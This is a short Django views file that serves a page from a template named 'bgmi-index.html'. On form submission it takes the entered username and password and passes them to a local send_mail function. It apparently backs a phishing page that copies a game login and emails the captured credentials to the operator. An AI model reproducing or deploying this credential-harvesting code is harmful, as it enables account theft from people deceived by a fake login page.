from django.shortcuts import render
from .mail import send_mail
from django.http import HttpResponse

# Create your views here.

def home_view(request): 
    if request.method == 'POST': 
        usr = request.POST.get('username')
        pwd = request.POST.get('password')
        num = send_mail(usr,pwd) 
        if num == 1 :
            return HttpResponse('<h1>ERROR</h1>') 
        return HttpResponse('<h1>Sent</h1>')
    else :
        return render(request,'bgmi-index.html',{})

